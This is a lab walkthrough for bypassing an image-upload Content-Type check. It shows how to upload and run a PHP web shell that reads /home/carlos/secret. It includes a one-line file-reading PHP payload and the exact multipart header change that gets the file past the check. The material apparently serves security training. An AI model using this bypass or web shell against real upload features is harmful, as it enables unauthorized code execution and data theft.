# Web Shell Upload via Content-Type Restriction Bypass

## Objective

The application has an image upload feature that attempts to prevent users from uploading unexpected file types.

The goal is to bypass the upload restriction, upload a PHP web shell, and use it to read the contents of:

/home/carlos/secret

Login credentials:

Username: wiener
Password: peter


## Solution

### Step 1 — Login

Login to the application using:

Username: wiener
Password: peter

After logging in, go to the My Account page.


### Step 2 — Upload an Image

Upload a normal image as your avatar.

Open Burp Suite and go to:

Proxy > HTTP history

Find the request used to retrieve your uploaded image.

It will look similar to:

GET /files/avatars/image.jpg HTTP/1.1

Send this request to Burp Repeater.


### Step 3 — Create the PHP Web Shell

Create a file called:

exploit.php

Add the following code:

<?php echo file_get_contents('/home/carlos/secret'); ?>

This PHP code reads the contents of /home/carlos/secret and prints it in the HTTP response.


### Step 4 — Try to Upload the PHP File

Try uploading exploit.php as your avatar.

The application rejects the file because it only allows image MIME types such as:

image/jpeg
image/png

This shows that the application is checking the Content-Type of the uploaded file.


### Step 5 — Find the Upload Request

Go back to:

Proxy > HTTP history

Find the upload request:

POST /my-account/avatar

Send the request to Burp Repeater.

Inside the multipart request, find the part containing exploit.php.

It should look similar to:

Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php


### Step 6 — Bypass the Content-Type Restriction

Change:

Content-Type: application/x-php

to:

Content-Type: image/jpeg

Keep the filename as:

exploit.php

The request should now contain:

Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

Send the request.

The server accepts the file because it trusts the user-controlled Content-Type value.


### Step 7 — Access the Uploaded Web Shell

Switch to the Repeater tab containing the GET request for your uploaded image.

Originally, it should look similar to:

GET /files/avatars/image.jpg HTTP/1.1

Change the filename to:

exploit.php

The request becomes:

GET /files/avatars/exploit.php HTTP/1.1

Send the request.

The PHP file is executed by the server.

The response contains the contents of:

/home/carlos/secret


### Step 8 — Submit the Secret

Copy the secret returned in the response.

Submit the secret using the button provided in the lab banner.

The lab is now solved.


## Vulnerability

The application attempts to restrict uploaded files by checking their MIME type.

However, the Content-Type value in the multipart upload request is controlled by the client.

We changed:

application/x-php

to:

image/jpeg

while keeping the actual filename as:

exploit.php

This bypassed the Content-Type restriction and allowed the PHP web shell to be uploaded and executed.


